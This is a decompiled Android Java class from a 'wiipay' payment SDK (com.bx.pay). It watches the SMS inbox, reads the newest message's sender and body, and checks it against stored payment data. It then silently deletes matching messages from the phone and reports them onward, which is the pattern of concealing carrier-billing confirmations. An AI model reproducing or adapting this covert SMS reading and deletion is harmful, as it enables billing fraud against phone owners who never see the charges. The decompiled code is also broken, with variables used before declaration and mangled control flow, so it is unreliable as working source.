package com.bx.pay;

import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.util.Log;
import com.bx.pay.a.c;
import com.bx.pay.a.f;
import com.bx.pay.a.g;
import com.bx.pay.utils.i;
import com.bx.pay.utils.n;
import java.util.Date;

final class q
  extends ContentObserver
{
  q(WpaySmsService paramWpaySmsService, Handler paramHandler)
  {
    super(paramHandler);
  }
  
  public final void onChange(boolean paramBoolean)
  {
    super.onChange(paramBoolean);
    for (;;)
    {
      try
      {
        ContentResolver localContentResolver = this.a.getContentResolver();
        Object localObject = localContentResolver.query(Uri.parse("content://sms/inbox"), new String[] { "_id", "address", "body", "date" }, null, null, "_id desc");
        if ((((Cursor)localObject).getCount() > 0) && (((Cursor)localObject).moveToFirst()))
        {
          l1 = ((Cursor)localObject).getLong(0);
          str3 = ((Cursor)localObject).getString(1);
          String str1 = ((Cursor)localObject).getString(2);
          long l2 = ((Cursor)localObject).getLong(3);
          localLong1 = Long.valueOf(l2);
          ((Cursor)localObject).close();
          if (l1 == -1L) {
            break;
          }
          f localF = i.b();
          g localG = i.c();
          if (WpaySmsService.access$0(this.a) == null) {
            WpaySmsService.access$1(this.a, c.a.getSharedPreferences("wiipay", 1));
          }
          Long localLong3 = Long.valueOf(WpaySmsService.access$0(this.a).getLong("latest.payTime", 0L));
          WpaySmsService.access$0(this.a).getString("latest.payType", "");
          String str4 = WpaySmsService.access$0(this.a).getString("latest.logCode", "");
          if ((localF == null) || (localLong3.longValue() <= 0L) || (!j.a(str3, str1, localLong1, localF, localG))) {
            break;
          }
          Long localLong2 = Long.valueOf(0L);
          localObject = localLong2;
          if (!n.a(localF.d()))
          {
            localObject = localLong2;
            if (n.a(localF.d())) {
              localObject = Long.valueOf(1000L * (60L * Long.valueOf(localF.d()).longValue()));
            }
          }
          l2 = localLong3.longValue();
          long l3 = ((Long)localObject).longValue();
          if ((localLong1.longValue() < new Date().getTime() - 10000L) || (localLong1.longValue() < localLong3.longValue()) || (localLong1.longValue() > Long.valueOf(l2 + l3).longValue())) {
            break;
          }
          int i = localContentResolver.delete(Uri.parse("content://sms"), "_id=?", new String[] { String.valueOf(l1) });
          if (localF.a().booleanValue())
          {
            if (i == 1) {
              j.a(str4, str3, str1, j.d.intValue());
            }
          }
          else
          {
            if (localG == null) {
              break;
            }
            j.a(str3, str1, localLong1, c.a, localG);
            return;
          }
          j.a(str4, str3, str1, j.e.intValue());
          continue;
        }
        String str3 = "";
      }
      catch (SecurityException localSecurityException)
      {
        Log.e(WpaySmsService.class.getName(), "no permission for read sms");
        return;
      }
      catch (Exception localException)
      {
        localException.printStackTrace();
        return;
      }
      Long localLong1 = Long.valueOf(0L);
      long l1 = -1L;
      String str2 = "";
    }
  }
}
